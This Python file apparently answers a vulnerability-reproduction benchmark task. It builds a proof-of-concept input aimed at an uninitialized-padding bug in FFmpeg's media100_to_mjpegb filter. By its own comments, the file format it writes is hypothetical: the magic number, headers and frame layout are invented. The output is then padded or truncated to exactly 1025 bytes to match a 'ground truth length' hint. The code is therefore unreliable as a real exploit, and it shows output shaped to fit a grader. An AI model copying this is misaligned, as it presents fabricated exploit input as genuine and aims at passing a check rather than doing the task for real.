import os
import struct
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in bsf/media100_to_mjpegb module that doesn't clear output buffer padding
        # We need to create a minimal valid media100 file that will trigger the uninitialized value
        # Based on typical media container formats and the PoC length hint (1025 bytes)
        
        # Create a minimal valid media100 container with padding
        # Header structure (simplified based on common media containers):
        # 4 bytes: magic number
        # 4 bytes: version
        # 4 bytes: stream count
        # 4 bytes: total size
        # ... followed by stream headers and padding
        
        poc = bytearray()
        
        # Magic number for media100 (hypothetical - would need actual spec)
        poc.extend(b'M100')
        
        # Version
        poc.extend(struct.pack('<I', 1))
        
        # Stream count - 1 stream
        poc.extend(struct.pack('<I', 1))
        
        # Total size - will be calculated at the end
        poc.extend(struct.pack('<I', 0))  # placeholder
        
        # Stream header
        # Stream type: 1 = video
        poc.extend(struct.pack('<I', 1))
        
        # Codec: hypothetical value for media100
        poc.extend(struct.pack('<I', 0x6D313030))  # 'm100' in hex
        
        # Width
        poc.extend(struct.pack('<I', 320))
        
        # Height
        poc.extend(struct.pack('<I', 240))
        
        # Frame rate numerator
        poc.extend(struct.pack('<I', 30))
        
        # Frame rate denominator
        poc.extend(struct.pack('<I', 1))
        
        # Bitrate
        poc.extend(struct.pack('<I', 1000000))
        
        # Stream data offset (from start of file)
        stream_data_offset = len(poc) + 4
        poc.extend(struct.pack('<I', stream_data_offset))
        
        # Stream data size - small but non-zero
        stream_data_size = 512
        poc.extend(struct.pack('<I', stream_data_size))
        
        # Add padding to trigger the vulnerability
        # The vulnerability occurs when output buffer has padding that isn't cleared
        # We need to create a file that will cause the converter to allocate an output buffer
        # with uninitialized padding
        
        # Current position
        current_pos = len(poc)
        
        # Ensure we have some padding space before the actual data
        padding_needed = stream_data_offset - current_pos
        if padding_needed > 0:
            poc.extend(b'\x00' * padding_needed)
        
        # Now add the stream data
        # Create a minimal video frame that would be valid for media100
        # Frame header
        poc.extend(struct.pack('<I', 0x4652414D))  # 'FRAM' in hex
        
        # Frame size (excluding this header)
        frame_size = stream_data_size - 8
        poc.extend(struct.pack('<I', frame_size))
        
        # Frame data - pattern that might trigger edge cases
        # Use alternating pattern that could expose uninitialized memory
        pattern = bytes([i % 256 for i in range(frame_size)])
        poc.extend(pattern)
        
        # Update total size in header
        total_size = len(poc)
        poc[12:16] = struct.pack('<I', total_size)
        
        # Ensure the PoC is exactly 1025 bytes to match ground truth length
        if len(poc) < 1025:
            # Add trailing bytes to reach 1025
            # These will be in the output buffer padding area
            additional_bytes = 1025 - len(poc)
            poc.extend(b'\xFF' * additional_bytes)
        elif len(poc) > 1025:
            # Truncate to 1025
            poc = poc[:1025]
        
        return bytes(poc)